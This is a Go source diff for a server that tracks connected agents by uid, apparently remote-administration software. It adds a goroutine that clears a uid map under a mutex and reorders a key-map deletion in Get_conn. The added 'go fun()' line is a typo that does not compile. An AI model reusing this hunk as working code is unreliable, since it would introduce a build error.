@@ -550,6 +550,11 @@ func User_index(web_route string)http.HandlerFunc {
 						    delete(key_map, uid)
 						    keyMu.Unlock()
 						}()
+						go fun() {
+							uidMutex.Lock()
+							delete(uid_base, uid)
+			                uidMutex.Unlock()
+						}()
                         logStr := fmt.Sprintf(log_word["removed_agent"], uid)
                         logger.WriteLog(logStr)
                         w.Header().Set("Content-Type", "application/json")
@@ -1801,10 +1806,6 @@ func Get_conn(uid, username, hostname, clientIP, base_rounds string) string {
     formattedTime := current.Format("2006.01.02 15:04")
     put_conn(username, hostname, formattedTime, uid, clientIP, "null")
 
-    keyMu.Lock()
-    delete(key_map, uid)
-    keyMu.Unlock()
-
     key1Mu.Lock()
     key1_map[uid] = nil
     key1Mu.Unlock()
@@ -1816,6 +1817,10 @@ func Get_conn(uid, username, hostname, clientIP, base_rounds string) string {
     key3Mu.Lock()
     key3_map[uid] = nil
     key3Mu.Unlock()
+
+	keyMu.Lock()
+    delete(key_map, uid)
+    keyMu.Unlock()
 
     for {
         if insert_key1_map(uid, base_rounds) {
